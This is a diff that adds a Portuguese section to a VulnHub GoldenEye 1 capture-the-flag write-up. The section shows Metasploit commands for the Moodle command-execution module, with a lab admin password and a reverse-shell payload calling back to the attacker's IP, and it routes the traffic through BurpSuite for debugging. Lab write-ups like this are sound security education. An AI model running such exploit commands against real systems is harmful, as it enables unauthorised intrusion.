@@ -1,6 +1,6 @@
 ---
 title: "VulnHub - GoldenEye 1"
-tags: [Linux, Medium, CC, Moodle, Kernel, Searchsploit, BurpSuite, Wfuzz, Gobuster, SMTP, Hydra]
+tags: [Linux, Medium, CC, Moodle, Kernel, Searchsploit, BurpSuite, Wfuzz, Gobuster, SMTP, Hydra, Msfconsole, Metasploit Framework, BurpSuite Proxy]
 categories: VulnHub
 ---
 
@@ -441,4 +441,61 @@ Pegamos a flag!
 
 Agora faz sentido aquele diretório que temos lá que tinha a final flag na web...
 
+# Algo a Mais
 
+Eu havia estranhado por que não tinha funcionado pelo msfconsole a exploração da máquina, ai deu uma pesquisada e descobri o por que... vamos lá...
+
+Pesquisamos por módulos que exploram o **moodle**
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf.png)
+
+Comandos utilizados
+
+```
+use exploit/multi/http/moodle_cmd_exec
+set rhosts severnaya-station.com
+set targeturi /gnocertdir/
+set username admin
+set password xWinter1995x!
+set payload cmd/unix/reverse
+set lhost 192.168.56.102
+set lport 55135
+```
+
+Tentamos explorar e vemos que deu errado...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf1.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf2.png)
+
+Jogamos a requisião para o BurpSuite então, pra ver exatamente o que está sendo enviado pro servidor
+
+```
+set proxies 127.0.0.1:8080
+```
+
+Enviamos
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf3.png)
+
+Aqui está...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf4.png)
+
+Analisando, devemos mudar algumas coisa pra ele funcionar...
+
+De cada verificamos que devemos mudar o HOST e a senha...
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf6.png)
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf5.png)
+
+Bom... isso é o básico pra ele poder enviar a requisição para o servidor corretamente...
+
+Trocamos também para todas as requisições irem pro servidor corretamente, em uma aba do BurpSuite podemos alterar isso
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf7.png)
+
+Contudo o exploit ainda não deu certo, ele vai para o servidor mas pelo que parece não me retorna um shell, creio que seja pelo fato de estar atrás de um proxy, quando tiver mais tempo debugo melhor isso, mas pelo menos serviu para verificarmos como funciona o BurpSuite como proxy para o metasploit e como realizar alterações nas requisições para um melhor funcionamento dos exploits
+
+![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/vulnhub-goldeneye1/msf8.png)
